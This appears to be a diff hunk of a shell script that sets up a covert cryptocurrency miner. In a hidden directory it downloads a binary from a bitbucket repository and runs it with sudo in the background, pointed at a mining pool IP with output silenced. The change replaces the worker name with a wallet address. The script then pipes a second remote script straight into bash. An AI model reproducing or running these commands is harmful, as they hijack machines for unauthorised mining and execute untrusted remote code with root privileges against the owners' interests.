@@ -20,5 +20,5 @@ ph add sgr1
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/koploks/file/raw/master/xmt >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 -a rx/0 -o 8.222.148.101:80 -u Modol -p x -t $(nproc --all) --donate-level 1 -k  > /dev/null 2>&1 &
+sudo ./sgr1 -a rx/0 -o 8.222.148.101:80 -u ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp -p x -t $(nproc --all) --donate-level 1 -k  > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash 
